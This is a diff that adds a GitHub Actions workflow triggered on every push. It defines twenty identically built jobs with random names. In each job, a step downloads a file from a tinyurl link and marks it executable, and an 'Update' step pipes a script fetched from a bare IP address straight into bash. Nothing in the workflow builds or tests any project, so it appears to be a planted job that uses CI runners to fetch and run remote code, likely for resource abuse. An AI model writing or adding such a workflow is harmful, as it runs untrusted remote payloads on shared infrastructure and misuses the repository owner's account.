@@ -1,0 +1,163 @@
+name: zuyawa
+on: push
+jobs:
+  xeramo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  marolula:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  fikuvi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  yunili:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  sejona:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  yajiju:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  fepeve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  rurosi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  tinabi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  tilaga:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  cuvizuce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  dicuyi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  pijube:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  faruwe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  xomagu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  zasobu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  xenasu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  nihuxoki:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  vurifo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
+  waxaku:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/rulunivame; chmod +x rulunivame
+    - name: Update
+      run: curl http://103.186.1.39/mandalorian/nilcbbrzaxenrywaq.php?a=hare | bash -
